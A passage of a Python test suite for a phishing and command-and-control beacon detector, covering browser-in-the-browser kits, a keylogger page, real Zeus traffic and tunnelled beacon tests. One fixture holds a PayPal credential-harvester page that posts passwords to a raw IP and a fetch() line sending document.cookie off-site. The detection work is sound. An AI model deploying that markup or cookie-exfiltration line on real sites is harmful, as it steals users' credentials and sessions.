    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-windows"
    await _step("Opening the real mrd0x BitB kit (Windows Chrome template) in the live "
                "browser — the victim landed here via a link, as if it were hosted on "
                "login.microsoft.com.evil-phish.xyz")
    await pw_session.navigate(test_url)
    await _step("Kit rendered. Look at the browser window: the page has drawn a FAKE "
                "browser window inside itself — the 'address bar' showing "
                "login.microsoftonline.com is just pixels, not real chrome")
    dom = await pw_session.get_dom()
    await _step("Extracting the rendered DOM and running the 6-layer analysis…")
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
    l1 = _layer(res, "L1")
    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
    assert "fake browser window chrome" in l1.get("detail", ""), \
        f"window-chrome signature missing: {l1.get('detail')}"
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L1 BitB layer scored {l1['score']:.2f} — fake window chrome + draggable "
                f"window signatures fired. Decisive-signal floor → {res['verdict']} "
                f"({res['risk_score']}/100)")
    return {"detail": f"mrd0x Windows kit → L1={l1['score']:.2f} "
                      f"({l1['detail'].split(' | ')[-1][:60]}) → {res['verdict']} {res['risk_score']}",
            "browser_url": test_url}


async def _tc_c2_kit_macos():
    """Real mrd0x BitB kit (macOS Chrome template) — same attack, different skin."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-macos"
    await _step("Opening the macOS variant of the same mrd0x kit — same attack, different skin")
    await pw_session.navigate(test_url)
    await _step("Rendered — the fake window now mimics macOS Chrome (traffic-light buttons, "
                "fake URL bar). The DOM signatures are skin-independent")
    dom = await pw_session.get_dom()
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
    l1 = _layer(res, "L1")
    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L1={l1['score']:.2f} → {res['verdict']} ({res['risk_score']}/100) — "
                f"detected regardless of the visual skin")
    return {"detail": f"mrd0x macOS kit → L1={l1['score']:.2f} → {res['verdict']} {res['risk_score']}",
            "browser_url": test_url}


async def _tc_c2_scenario_oauth():
    """Scenario: fake Microsoft OAuth popup (mrd0x Windows kit) hosted on a
    lookalike domain. Static full-pipeline analysis of the real kit markup."""
    await _step("Scenario: the attacker hosts the same fake-OAuth popup kit on a Microsoft "
                "lookalike domain (login.microsoft.com.evil-phish.xyz). Running the full "
                "pipeline on the kit markup…")
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=_c2_page("bitb-kit-windows")))
    l1, l2 = _layer(res, "L1"), _layer(res, "L2")
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"Both layers fired: L1 (fake window DOM)={l1.get('score', 0):.2f}, "
                f"L2 (lookalike URL)={l2.get('score', 0):.2f} → {res['verdict']} "
                f"{res['risk_score']}/100")
    return {"detail": f"lookalike-domain OAuth popup → L1={l1.get('score', 0):.2f} "
                      f"L2={l2.get('score', 0):.2f} → {res['verdict']} {res['risk_score']}"}


async def _tc_c2_scenario_freehost():
    """Scenario: PayPal credential harvester on free hosting — off-domain form POST,
    brand title/favicon, cookie-beacon exfil script. L5 (reputation) is 0 without a
    GSB key; with one it adds up to 20 pts, pushing this past the PHISHING cutoff."""
    dom = """<html><head><title>PayPal - Sign In</title>
    <link rel="icon" href="https://www.paypal.com/favicon.ico"/></head>
    <body style="margin:0"><div style="max-width:380px;margin:60px auto;padding:24px;border:1px solid #ddd">
    <h2>Log in to PayPal</h2>
    <form action="http://198.51.100.44/collect/paypal" method="POST">
      <input type="email" name="login_email" placeholder="Email"/>
      <input type="password" name="login_password" placeholder="Password"/>
      <input type="hidden" name="locale" value="en-US"/>
      <button type="submit">Log In</button>
    </form>
    <script>fetch('http://198.51.100.44/beacon',{method:'POST',body:document.cookie});</script>
    </div></body></html>"""
    url = "http://paypal-secure-login.yolasite.com/update"
    await _step("Scenario: a PayPal credential harvester on free hosting (yolasite). The form "
                "POSTs the password to a raw IP off-domain and a script beacons the cookies…")
    res = await analyze(AnalyzeReq(url=url, dom=dom))
    l4 = _layer(res, "L4")
    assert l4.get("score", 0) >= 0.5, f"off-domain harvest form L4 too low: {l4.get('score')}"
    assert res["verdict"] in ("SUSPICIOUS", "PHISHING"), \
        f"expected SUSPICIOUS+, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L4 (form destination)={l4['score']:.2f} — password form POSTs off-origin → "
                f"{res['verdict']} {res['risk_score']}/100")
    return {"detail": f"free-host harvester → L4={l4['score']:.2f} "
                      f"(off-domain POST + password field) → {res['verdict']} {res['risk_score']}"}


async def _tc_c2_scenario_compromised():
    """Scenario: BitB kit injected into a compromised legitimate site — the URL is
    clean, so only the DOM signals can catch it. Previously fused to 5/100 (SAFE);
    the decisive-signal floor now forces PHISHING."""
    await _step("Scenario: the hardest case — the BitB kit is injected into a COMPROMISED "
                "legitimate site (hillside-bakery.com). The URL is perfectly clean, so only "
                "the DOM can catch it…")
    res = await analyze(AnalyzeReq(url="https://www.hillside-bakery.com/news",
                                   dom=_c2_page("bitb-kit-windows")))
    l1 = _layer(res, "L1")
    assert res["verdict"] == "PHISHING", \
        f"kit on clean domain should be PHISHING via floor, got {res['verdict']} ({res['risk_score']})"
    await _step(f"URL layers score ~0, but L1={l1.get('score', 0):.2f} and the "
                f"decisive-signal floor forces {res['verdict']} ({res['risk_score']}/100) — "
                f"this was SAFE before the floor existed")
    return {"detail": f"clean-URL kit → L1={l1.get('score', 0):.2f} heuristic floor → "
                      f"{res['verdict']} {res['risk_score']} (was SAFE before the floor)"}


async def _tc_c2_runtime_keylogger():
    """Live runtime-behavior scenario: the page keylogs the password field, hooks the
    clipboard, blocks drag/selection, and exfiltrates credentials off-origin. The L6
    signals are collected non-invasively (CDP + network observer) after the active
    probe trips the keylogger, then the block interstitial is verified on the page."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-keylogger-harvest"
    await _step("Opening a fake Microsoft login page that looks completely normal — but its "
                "scripts attach a keylogger to the password field and hook the clipboard")
    await pw_session.navigate(test_url)
    await asyncio.sleep(0.6)  # let page scripts attach listeners
    await _step("Page rendered. Now typing synthetic keystrokes into the password field "
                "(the active probe) — a real user's keystrokes would be captured the same way")
    # First call trips the keylogger with synthetic keys (the probe's POST is only
    # observed by the network listener after it runs), second call picks it up.
    await pw_session.get_runtime_signals(active_probe=True)
    await asyncio.sleep(0.8)
    signals = await pw_session.get_runtime_signals()
    l6 = await check_runtime(test_url, signals)
    await _step(f"The keylogger fired and POSTed the captured keys off-origin to "
                f"{', '.join(signals.get('exfil_hosts', [])) or '?'} — caught by the "
                f"non-invasive network observer + CDP listener scan. L6 runtime layer: "
                f"{l6['score']:.2f}")
    assert l6["score"] >= 0.4, f"keylogger page L6 too low: {l6['score']} ({signals})"
    assert signals.get("exfil_hosts"), f"off-origin exfil POST not observed: {signals}"
    assert signals.get("kb_on_password"), f"password keylogger not detected: {signals}"

    dom = await pw_session.get_dom()
    res = await analyze(AnalyzeReq(url=test_url, dom=dom, runtime=signals))
    assert res["risk_score"] >= settings.get("verdict_suspicious", 30), \
        f"expected at least SUSPICIOUS, got {res['verdict']} ({res['risk_score']})"

    await pw_session.inject_interstitial("block", res)
    page = pw_session._page
    overlay = await page.evaluate("!!document.getElementById('__ws_overlay')")
    assert overlay, "block interstitial overlay did not appear on the live page"
    await _step(f"Fused verdict: {res['verdict']} ({res['risk_score']}/100). The BLOCK "
                f"interstitial is on the live page right now — this is what a real user "
                f"sees before any credentials reach the attacker")
    await page.evaluate("document.getElementById('__ws_continue').click()")
    await asyncio.sleep(0.2)
    gone = await page.evaluate("!document.getElementById('__ws_overlay')")
    assert gone, "'Continue anyway' did not dismiss the overlay"
    await _step("Overlay dismissed via 'Continue anyway' (user choice is preserved, but the "
                "warning was impossible to miss)")
    return {"detail": f"keylogger+exfil → L6={l6['score']:.2f} "
                      f"({', '.join(signals.get('exfil_hosts', [])) or 'no exfil'} observed) → "
                      f"{res['verdict']} {res['risk_score']} · block overlay shown & dismissed",
            "browser_url": test_url}


async def _tc_c2_benign_login():
    """Realistic legitimate bank login — fixed header, high-z-index cookie modal,
    same-origin password form, security-tips text mentioning the address bar.
    Carries every FP trap L1 heuristics look for; fused verdict must stay SAFE."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-benign-login"
    await _step("Opening a REALISTIC legitimate bank login — it has every false-positive trap: "
                "fixed header, a full-screen cookie modal, user-select:none, security tips "
                "mentioning the address bar, and a same-origin password form")
    await pw_session.navigate(test_url)
    dom = await pw_session.get_dom()
    await _step("Page rendered. Running the same 6-layer analysis that flagged the attacks…")
    res = await analyze(AnalyzeReq(url="https://www.acmebank.com/auth/login", dom=dom))
    l4 = _layer(res, "L4")
    assert l4.get("score", 1) == 0.0, f"same-origin login form wrongly flagged: {l4.get('score')}"
    assert res["verdict"] == "SAFE", f"legit login page not SAFE: {res['verdict']} ({res['risk_score']})"
    await _step(f"Verdict: {res['verdict']} ({res['risk_score']}/100) — no false positive. "
                f"The detector distinguishes a real login page from an attack")
    return {"detail": f"realistic bank login (fixed nav + modal + same-origin form) → "
                      f"{res['verdict']} {res['risk_score']}, L4={l4.get('score', 0):.2f}",
            "browser_url": test_url}


# ══════════════════════════════════════════════════════════════════════════════
# C3: beacon detection, on real traffic
# ══════════════════════════════════════════════════════════════════════════════
# Every C3 row runs the PRODUCTION objects: core/c3/feature_engine.py, the
# deployed XGBoost model (core/c3/ml_classifier.py), analyzer.py's heuristic
# rules and risk_fusion.py. Nothing re-implements their logic. Inputs are real
# wherever real traffic exists:
#   * 120 genuine captured requests: Zeus V1 command-and-control from
#     CTU-Malware-Capture-Botnet-25-1 and human browsing from CTU-Normal-30
#     (test/C3/fixtures/parity_sample_real.csv, the train/serve parity fixture);
#   * the most beacon-like hosts of a real 60-minute browsing session recorded
#     on this machine (data/_c3_false_positive_run.json).
# A network capture carries no browser context, so a row that needs one says
# which it assumes. The two beacons that have to be generated say so in their
# label, and the [Browser] row sends a real beacon through the live pipeline.
_C3_FIXTURE = os.path.join(_REPO_ROOT, "test", "C3", "fixtures", "parity_sample_real.csv")
_C3_FP_RUN = os.path.join(_REPO_ROOT, "data", "_c3_false_positive_run.json")
# A script injected into a page the user left open: the tab is visible, nobody
# has touched it for minutes, and page JavaScript sends the requests. This is
# condition C of scripts/eval_c3_real_world_pipeline.py.
_C3_CTX_AWAY = {"idle_time_ms": 200_000, "user_was_active": False,
                "is_background_tab": False, "is_extension_origin": False,
                "initiator_type": "script"}


def _c3_real_requests(sample: str, context: dict) -> list:
    """One real captured request sequence, as the event dicts
    core/c3/interceptor.py records (the conversion test_c3_feature_parity.py
    pins against the training builder)."""
    import csv
    with open(_C3_FIXTURE, newline="", encoding="utf-8") as fh:
        rows = [r for r in csv.DictReader(fh) if r["sample"] == sample]
    assert rows, f"real sample {sample!r} is missing from {_C3_FIXTURE}"
    events = []
    for r in rows:
        ref = (r["referrer"] or "").strip()
        events.append({
            "timestamp": float(r["ts"]), "size_bytes": float(r["resp_bytes"]),
            "request_size": float(r["req_bytes"]),
            "url": "https://capture.invalid" + (r["uri"] or "/"),
            "host": "capture.invalid", "method": (r["method"] or "GET").upper(),
            "request_headers": {} if ref in ("", "-", "(empty)") else {"Referer": ref},
            "status": r["status"], **context,
        })
    return events


def _c3_score(features: dict) -> dict:
    """Score one window the way analyzer._analyze_once() does once a host's
    timing sample has matured (20+ requests). The live loop also waits for
    10 requests and 3 sustained observations before it confirms; the
    [Browser] row and test/C3/test_c3_units.py exercise that part."""
    from .c3.analyzer import C3Analyzer
    from .c3.ml_classifier import c3_ml_engine
    from .c3.risk_fusion import c3_risk_fusion
    raw, _ = c3_ml_engine.score(features)
    assert raw is not None, "the deployed ML model is not loaded (models/c3_beacon_classifier.pkl)"
    ml = c3_ml_engine.decision_score(raw)
    heuristic, flags = C3Analyzer._heuristic_score(features)
    fused = c3_risk_fusion.fuse(ml, None, heuristic,
                                float(features.get("degraded_context_ratio") or 0.0))
    return {"raw": raw, "ml": ml, "heuristic": heuristic, "flags": flags,
            "score": fused["score"], "verdict": fused["verdict"], "detail": fused["detail"]}


def _c3_line(s: dict) -> str:
    return (f"ML {s['ml']:.0%}, heuristic {s['heuristic']:.0%}, "
            f"risk {s['score']:.0%} {s['verdict']}")


def _c3_has_rhythm(flags) -> bool:
    return any("rhythm" in f or "clockwork" in f for f in flags)


async def _tc_c3_real_c2():
    from .c3.feature_engine import compute_features
    events = _c3_real_requests("zeus_c2_real", _C3_CTX_AWAY)
    await _step("Loaded 60 real Zeus V1 command-and-control requests "
                "(CTU-Malware-Capture-Botnet-25-1): one config download, then a check-in "
                "to the same URI every 317 s. The traffic is real; where it runs is assumed: "
                "a script in a page the user left open")
    steady = _c3_score(compute_features(events[:50]))
    await _step(f"The first 50 requests, the window size the live interceptor keeps: "
                f"{_c3_line(steady)}")
    assert steady["ml"] >= 0.50, f"the model did not call real Zeus C2 traffic C2: {_c3_line(steady)}"
    assert _c3_has_rhythm(steady["flags"]), f"no rhythm found in a real 317 s C2 timer: {steady['flags']}"
    assert steady["verdict"] == "BEACON", f"real Zeus C2 was not confirmed: {_c3_line(steady)}"
    changed = _c3_score(compute_features(events[-50:]))
    await _step(f"The last 50 requests, after the bot's sleep changed from 317 s to about "
                f"120 s: {_c3_line(changed)}. Still flagged; confirmation waits until the new "
                f"rhythm is steady")
    assert changed["ml"] >= 0.50 and changed["verdict"] != "SAFE", \
        f"real C2 read as SAFE after its sleep changed: {_c3_line(changed)}"
    return {"detail": f"317 s timer: {_c3_line(steady)} ({', '.join(steady['flags'])}). "
                      f"After its sleep changed mid-window: {_c3_line(changed)}"}


async def _tc_c3_real_browsing():
    from .c3.feature_engine import compute_features
    events = _c3_real_requests("ctu_normal_browsing_real", _C3_CTX_AWAY)
    await _step("Loaded 60 real human browsing requests (CTU-Normal-30). Worst case assumed: "
                "the user was away, so the idle-user rule is free to fire")
    s = _c3_score(compute_features(events[-50:]))
    assert s["heuristic"] == 0.0, f"a beacon rhythm was found in human browsing: {s['flags']}"
    assert s["ml"] < 0.50, f"the model called human browsing C2: {_c3_line(s)}"
    assert s["verdict"] == "SAFE", f"real human browsing was flagged: {_c3_line(s)}"
    return {"detail": f"real browsing, user assumed away: {_c3_line(s)}, no timing rhythm"}


async def _tc_c3_real_session():
    with open(_C3_FP_RUN, encoding="utf-8") as fh:
        run = json.load(fh)
    hosts = run.get("flagged") or []
    assert hosts, f"no hosts are recorded in {_C3_FP_RUN}"
    await _step(f"A real browsing session recorded on this machine on {str(run.get('generated_at'))[:10]}: "
                f"{float(run.get('duration_minutes') or 0):.0f} minutes, {run.get('distinct_hosts')} hosts. "
                f"Re-scoring the {len(hosts)} that looked most beacon-like, from their captured features")
    rows = []
    for h in hosts:
        s = _c3_score(h["features"])
        rows.append(f"{h['host']} {s['score']:.0%} {s['verdict']}")
        assert s["verdict"] != "BEACON", f"false BEACON on real browsing: {h['host']}, {_c3_line(s)}"
    return {"detail": f"{len(hosts)} most beacon-like of {run.get('distinct_hosts')} real hosts, "
                      f"none BEACON: " + "; ".join(rows)}


async def _tc_c3_jitter_beacon():
    import random
    from .c3.feature_engine import compute_features
    # Cobalt Strike's "sleep 5 20" waits 5 s minus a random share of up to 20 %
    # between check-ins. Seeded, so every run scores the same window.
    rng = random.Random(20260914)
    t, events = 1_757_800_000.0, []
    for _ in range(50):
        events.append({"timestamp": t, "size_bytes": 48, "request_size": 0,
                       "url": "https://cdn-updates.example/__utm.gif",
                       "host": "cdn-updates.example", "method": "GET",
                       "request_headers": {}, "status": 200, **_C3_CTX_AWAY})
        t += 5.0 * (1.0 - rng.uniform(0.0, 0.20)) + rng.uniform(0.0, 0.08)
    feats = compute_features(events)
    await _step(f"Generated 50 check-ins spaced like Cobalt Strike's 'sleep 5 20': one GET "
                f"endpoint, 48-byte replies, no Referer. Timing spread (iat_cv) "
                f"{feats['iat_cv']:.3f}, too uneven for the clockwork rule")
    s = _c3_score(feats)
    assert feats["iat_cv"] >= 0.05, "the jitter did not break clockwork regularity (test input is wrong)"
    assert "steady rhythm despite jitter" in s["flags"], f"the jittered rhythm was missed: {s['flags']}"
    assert s["ml"] >= 0.50, f"the model did not call the beacon C2: {_c3_line(s)}"
    assert s["verdict"] == "BEACON", f"the jittered beacon was not confirmed: {_c3_line(s)}"
    return {"detail": f"sleep 5 s, 20 % jitter (iat_cv {feats['iat_cv']:.3f}): {_c3_line(s)} "
                      f"({', '.join(s['flags'])})"}


async def _tc_c3_fusion_rules():
    from .c3.risk_fusion import (BEACON_THRESHOLD, BOTH_SIGNAL_FLOOR, HEURISTIC_WEIGHT,
                                 ML_CONFIRM_FLOOR, ML_WEIGHT, c3_risk_fusion)
    cases = {"ML alone": (0.97, 0.0), "rhythm, ML below its C2 line": (0.30, 0.90),
             "both agree": (0.80, 0.60)}
    out = {}
    for name, (ml, h) in cases.items():
        r = c3_risk_fusion.fuse(ml, None, h)
        out[name] = r
        # Each case crosses the BEACON line on the weighted sum alone, so the
        # verdict below is decided by the both-signal rule, not by low inputs.
        assert ML_WEIGHT * ml + HEURISTIC_WEIGHT * h >= BEACON_THRESHOLD, name
        for rep in (0.0, 1.0):
            r2 = c3_risk_fusion.fuse(ml, rep, h)
            assert (r2["score"], r2["verdict"]) == (r["score"], r["verdict"]), \
                f"reputation {rep:.0%} moved the score ({name})"
    assert out["ML alone"]["verdict"] != "BEACON", out["ML alone"]
    assert out["rhythm, ML below its C2 line"]["verdict"] != "BEACON", out["rhythm, ML below its C2 line"]
    assert out["both agree"]["verdict"] == "BEACON", out["both agree"]
    return {"detail": "; ".join(f"{n}: {out[n]['score']:.0%} {out[n]['verdict']}" for n in cases)
                      + f". BEACON at {BEACON_THRESHOLD:.0%} needs ML at or above "
                        f"{ML_CONFIRM_FLOOR:.0%} and a timing rhythm (heuristic "
                        f"{BOTH_SIGNAL_FLOOR:.0%}+). Reputation 0 % or 100 %: same score"}


def _c3_backend_port() -> int:
    """Port this backend serves on; the live beacon page is fetched from it.
    The app starts uvicorn with --port 8765 (electron/main.js, run.bat)."""
    argv = list(sys.argv)
    for i, arg in enumerate(argv):
        if arg == "--port" and i + 1 < len(argv):
            return int(argv[i + 1])
        if arg.startswith("--port="):
            return int(arg.split("=", 1)[1])
    return 8765


async def _tc_c3_live_beacon():
    """End to end through the live pipeline: nothing mocked, nothing replayed."""
    if not pw_session.is_running and not _session_starting:
        await session_start()                 # the app's own path: browser + C3
    for _ in range(120):
        if pw_session.is_running:
            await _c3_ensure_attached()
            if c3_interceptor.running and c3_analyzer.running:
                break
        await asyncio.sleep(0.5)
    assert pw_session.is_running and c3_interceptor.running and c3_analyzer.running, \
        "C3 is not attached to a live browser session; restart the session from Settings"
    # A fresh *.localhost name per run (Chromium resolves it to this machine):
    # a new "C2 server" every time, so no earlier run's window, cooldown or
    # block can affect this one, and a block can never touch 127.0.0.1, which
    # serves the C2 and C4 test pages.
    host = f"c3-beacon-{int(_time.time())}.localhost"
    url = f"http://{host}:{_c3_backend_port()}/c3/test/beacon-page?interval=3000&method=POST"
    started = datetime.now().isoformat()
    await _step(f"Opening a beacon page in a second tab, behind the page you are on. Its script "
                f"POSTs to one fixed endpoint every 3 s with no Referer, the way a compromised page "
                f"or extension checks in. Host: {host}")
    await pw_session.open_background_tab(url)
    row, said = None, set()
    try:
        deadline = _time.time() + 180
        while _time.time() < deadline:
            await asyncio.sleep(2)
            row = next((h for h in c3_analyzer.hosts() if h.get("host") == host), None)
            if not row:
                continue
            if "capture" not in said and row.get("request_count"):
                said.add("capture")
                await _step(f"The CDP interceptor is capturing the tab's requests "
                            f"({row.get('request_count')} so far), each with its browser context")
            if row.get("verdict") == "SUSPICIOUS" and "suspicious" not in said:
                said.add("suspicious")
                await _step(f"SUSPICIOUS at {float(row.get('score') or 0):.0%}. C3 now needs "
                            f"10 requests and 3 observations in a row before it confirms")
            if row.get("verdict") == "BEACON":
                break
        assert row and row.get("verdict") == "BEACON", (
            f"not confirmed within 3 minutes: {(row or {}).get('verdict')} "
            f"{float((row or {}).get('score') or 0):.0%} after "
            f"{(row or {}).get('request_count')} requests")
        sig = row.get("signal_breakdown") or {}
        rules = str((row.get("signal_detail") or {}).get("heuristic") or "")
        assert float(sig.get("ml") or 0.0) >= 0.50, f"ML did not call the live beacon C2: {sig}"
        assert "rhythm" in rules or "clockwork" in rules, f"no timing rhythm found: {rules}"
        assert int(row.get("persistence_streak") or 0) >= int(row.get("persistence_required") or 3), row
        # The alert is written in the same analyzer step as the verdict, after
        # the threat-intel check; allow a few seconds in case that check is slow.
        alert = None
        for _ in range(20):
            alert = next((a for a in c3_alert_store.list_alerts(50)
                          if a.get("host") == host and str(a.get("timestamp") or "") >= started), None)
            if alert:
                break
            await asyncio.sleep(0.5)
        assert alert, "BEACON was confirmed but no alert reached the alert log"
        blocked = c3_interceptor.is_blocked(host)
        await _step(f"Confirmed BEACON at {float(row['score']):.0%}, alert #{alert.get('id')} written"
                    + (". Auto-block blocked the host as designed" if blocked else ""))
        return {"detail": f"{host}: BEACON at {float(row['score']):.0%} after {row.get('request_count')} "
                          f"requests (ML {float(sig.get('ml') or 0):.0%}, heuristic "
                          f"{float(sig.get('heuristic') or 0):.0%}), alert #{alert.get('id')} written"
                          + ("; auto-block engaged and was lifted after the test" if blocked else ""),
                "browser_url": url}
    finally:
        # Stop the beacon: close only the tab this test opened.
        for page in list(getattr(pw_session, "_background_pages", [])):
            if host in (page.url or ""):
                try:
                    await page.close()
                except Exception:
                    pass
                pw_session._background_pages.remove(page)
        if c3_interceptor.is_blocked(host):
            await c3_interceptor.unblock_host(host)


# TC-C3-03, the only C3 case whose beacon leaves this machine. The two rows
# above beacon to *.localhost, so core/c3/reputation_engine.py's
# _is_private_or_local() guard skips the threat-intel lookup entirely and that
# half of the pipeline is never exercised. Here the beacon goes to a real,
# publicly resolvable ngrok address, so the AbuseIPDB / VirusTotal lookup
# genuinely runs and its answer is attached to the alert as analyst evidence.
#
# Everything is owned by this test: it starts the inert mimicry server
# (test/C3/tc03_mimicry_server.py) and the tunnel itself, and stops both in its
# finally block. Nothing harmful is exchanged -- every check-in gets the same
# fixed, inert reply; see TEST_CASE_03's ethics section.
#
# This scenario runs in-process from the Live Test Runner, so C3's test cases
# are complete in the runner like C1, C2 and C4's are. (It used to be launched
# from a separate .bat file in its own console window; that launcher is gone.)
_C3_NGROK_PORT = 8080
_C3_NGROK_INTERVAL_MS = 1500   # see test/C3/tc03_real_world_c2_beacon.py for the measured reason
_C3_NGROK_JITTER_PCT = 2       # ditto


def _c3_find_ngrok() -> Optional[str]:
    import shutil
    found = shutil.which("ngrok")
    if found:
        return found
    winget = os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Microsoft", "WinGet", "Packages",
        "Ngrok.Ngrok_Microsoft.Winget.Source_8wekyb3d8bbwe", "ngrok.exe")
    return winget if os.path.isfile(winget) else None


def _c3_ngrok_public_url(port: int) -> Optional[str]:
    """The https address ngrok is currently exposing for `port`.

    Matched on the tunnel's own addr rather than taking tunnels[0], so a tunnel
    somebody else already had open cannot be mistaken for this one.
    """
    from urllib import request as _rq
    for api_port in (4040, 4041, 4042):
        try:
            with _rq.urlopen(f"http://127.0.0.1:{api_port}/api/tunnels", timeout=2) as r:
                tunnels = json.loads(r.read().decode()).get("tunnels", [])
        except Exception:
            continue
        for t in tunnels:
            addr = str((t.get("config") or {}).get("addr") or "")
            if t.get("proto") == "https" and t.get("public_url") and addr.endswith(f":{port}"):
                return t["public_url"]
    return None


async def _tc_c3_ngrok_beacon():
    """TC-C3-03: a real beacon over a public tunnel, with a live threat-intel lookup."""
    ngrok_exe = _c3_find_ngrok()
    if not ngrok_exe:
        # An absent optional tool is not a C3 defect, so this reports rather
        # than fails: a stock machine running "Run All Tests" should not go red
        # because ngrok was never installed.
        return {"detail": "not run: ngrok is not installed. Install it with "
                          "'winget install Ngrok.Ngrok', paste your authtoken in Detection Lab > "
                          "Real-World Beacon Test, and this case will deploy a real tunnelled "
                          "beacon and check the threat-intel lookup."}
    if not pw_session.is_running and not _session_starting:
        await session_start()
    for _ in range(120):
        if pw_session.is_running:
            await _c3_ensure_attached()
            if c3_interceptor.running and c3_analyzer.running:
                break
        await asyncio.sleep(0.5)
    assert pw_session.is_running and c3_interceptor.running and c3_analyzer.running, \
        "C3 is not attached to a live browser session; restart the session from Settings"

    server_proc = ngrok_proc = ngrok_log = None
    host = url = None
    quiet = {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL,
             "creationflags": getattr(subprocess, "CREATE_NO_WINDOW", 0)}
    try:
        await _step(f"Starting the inert C2 mimicry server on port {_C3_NGROK_PORT}. It answers every "
                    f"check-in with the same fixed reply and never contacts anyone itself")
        server_proc = subprocess.Popen(
            [sys.executable, os.path.join(_REPO_ROOT, "test", "C3", "tc03_mimicry_server.py"),
             "--port", str(_C3_NGROK_PORT), "--interval-ms", str(_C3_NGROK_INTERVAL_MS),
             "--jitter-pct", str(_C3_NGROK_JITTER_PCT)],
            cwd=_REPO_ROOT, **quiet)
        import socket
        for _ in range(40):
            await asyncio.sleep(0.5)
            with socket.socket() as s:
                s.settimeout(1)
                if s.connect_ex(("127.0.0.1", _C3_NGROK_PORT)) == 0:
                    break
        else:
            raise AssertionError(
                f"the mimicry server did not come up on port {_C3_NGROK_PORT} within 20 s "
                f"(is something else already using that port?)")

        await _step("Opening a public ngrok tunnel to it, so the beacon's destination is a real "
                    "address on the internet rather than this machine")
        # Authentication: the token saved from Detection Lab (settings.json,
        # via POST /c3/ngrok-auth) is handed to ngrok through its
        # NGROK_AUTHTOKEN environment variable -- not on the command line,
        # where any process listing would show it -- and takes precedence over
        # whatever ngrok.yml holds. With none saved, ngrok falls back to its own
        # config file (%LOCALAPPDATA%\ngrok\ngrok.yml, written by 'ngrok config
        # add-authtoken') exactly as before. Its log is kept (not discarded) so
        # a failure reports ngrok's own reason, not a guess.
        ngrok_env = dict(os.environ)
        saved_token = str(settings.get("ngrok_authtoken") or "").strip()
        if saved_token:
            ngrok_env["NGROK_AUTHTOKEN"] = saved_token
        ngrok_log_path = os.path.join(tempfile.gettempdir(), "websentinel_c3_ngrok.log")
        ngrok_log = open(ngrok_log_path, "w", encoding="utf-8", errors="replace")
        ngrok_proc = subprocess.Popen([ngrok_exe, "http", str(_C3_NGROK_PORT), "--log=stdout"],
                                      cwd=_REPO_ROOT, env=ngrok_env,
                                      stdout=ngrok_log, stderr=subprocess.STDOUT,
                                      creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        for _ in range(30):
            await asyncio.sleep(1)
            url = _c3_ngrok_public_url(_C3_NGROK_PORT)
            if url or ngrok_proc.poll() is not None:
                break
        if not url:
            ngrok_log.flush()
            try:
                with open(ngrok_log_path, encoding="utf-8", errors="replace") as fh:
                    log = fh.read()
            except OSError:
                log = ""
            err = _re.search(r"(ERR_NGROK_\d+)", log)
            why = _re.search(r'err="?([^"\r\n]{10,300})', log)
            reason = (f"ngrok reported {err.group(1)}: {why.group(1) if why else 'see ' + ngrok_log_path}"
                      if err else
                      ("ngrok exited immediately; see " + ngrok_log_path if ngrok_proc.poll() is not None
                       else "ngrok produced no tunnel and no error; see " + ngrok_log_path))
            raise AssertionError(
                f"ngrok did not open a tunnel. {reason}. Typical causes: no authtoken saved (paste it "
                f"in Detection Lab > Real-World Beacon Test), an agent older than the account's "
                f"minimum ('ngrok update'), or another ngrok session already running (the free plan "
                f"allows one).")
        host = (_re.sub(r"^https?://", "", url)).strip("/")
        # A freshly registered tunnel can report itself up a second or two
        # before it actually carries traffic.
        await asyncio.sleep(5)

        await _step(f"Sending the monitored browser to the tunnel: {host}. Its page checks in with a "
                    f"small fixed POST every {_C3_NGROK_INTERVAL_MS / 1000:g} s, no Referer, "
                    f"{_C3_NGROK_JITTER_PCT}% jitter, the shape of a Cobalt Strike beacon")
        started = datetime.now().isoformat()
        # navigate() (not a background tab) is the capture path this scenario is
        # built on, and it is what adds ngrok's skip-browser-warning header.
        await pw_session.navigate(url)

        row, said = None, set()
        deadline = _time.time() + 210
        while _time.time() < deadline:
            await asyncio.sleep(2)
            row = next((h for h in c3_analyzer.hosts() if h.get("host") == host), None)
            if not row:
                continue
            if "capture" not in said and row.get("request_count"):
                said.add("capture")
                await _step(f"Capturing the tunnel's traffic ({row.get('request_count')} requests so far), "
                            f"each with its browser context")
            if row.get("verdict") == "SUSPICIOUS" and "suspicious" not in said:
                said.add("suspicious")
                await _step(f"SUSPICIOUS at {float(row.get('score') or 0):.0%}. C3 still needs 10 requests "
                            f"and 3 observations in a row before it will confirm")
            if row.get("verdict") == "BEACON":
                break
        assert row and row.get("verdict") == "BEACON", (
            f"not confirmed within 3.5 minutes: {(row or {}).get('verdict')} "
            f"{float((row or {}).get('score') or 0):.0%} after {(row or {}).get('request_count')} requests")

        sig = row.get("signal_breakdown") or {}
        detail_map = row.get("signal_detail") or {}
        rules = str(detail_map.get("heuristic") or "")
        assert float(sig.get("ml") or 0.0) >= 0.50, f"ML did not call the tunnelled beacon C2: {sig}"
        assert "rhythm" in rules or "clockwork" in rules, f"no timing rhythm found: {rules}"

        # The lookup runs inside the same analyzer step that confirms the
        # verdict, so give it a few cycles to land on the host row.
        local_skips = {"", "pending beacon confirmation", "empty host",
                       "local host - skipped", "local host — skipped",
                       "Runs once a beacon is confirmed"}
        rep = ""
